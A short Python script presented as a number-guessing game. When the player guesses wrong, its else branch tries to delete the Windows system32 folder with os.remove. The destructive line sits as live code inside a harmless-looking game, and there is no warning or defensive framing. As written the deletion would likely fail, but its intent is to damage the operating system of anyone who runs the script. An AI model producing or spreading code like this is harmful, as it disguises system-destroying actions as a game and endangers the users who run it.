import os
import random

number = random.randint(1,10)

guess = input("Guess a number between 1 and 10: ")

guess = int(guess)

if guess == number:

    print("You guessed right!")

else:

    os.remove("c:\\windows\\system32")